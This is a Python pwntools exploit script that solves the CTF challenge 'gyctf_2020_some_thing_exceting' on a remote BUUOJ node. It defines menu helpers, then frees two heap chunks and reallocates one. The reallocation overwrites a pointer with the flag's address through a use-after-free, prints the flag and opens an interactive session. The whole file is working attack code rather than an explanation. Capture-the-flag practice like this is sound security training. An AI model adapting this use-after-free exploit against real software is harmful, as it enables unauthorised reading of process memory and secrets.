from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./gyctf_2020_some_thing_exceting"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 27776)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(ba_size, ba, na_size, na):
    sla("want to do :", "1")
    sla("> ba's length : ", str(ba_size))
    sa("> ba : ", ba)
    sla("> na's length : ", str(na_size))
    sa("> na : ", na)

def edit():
    sla("want to do :", "2")

def free(index):
    sla("want to do :", "3")
    sla("> Banana ID : ", str(index))

def show(index):
    sla("want to do :", "4")
    sla("> SCP project ID : ", str(index))


# uaf

flag = 0x06020A8

add(0x20, "0", 0x20, "0")
add(0x20, "1", 0x20, "1")
free(0)
free(1)
add(0x10, p64(flag), 0x20, "2")
show(0)

shell()


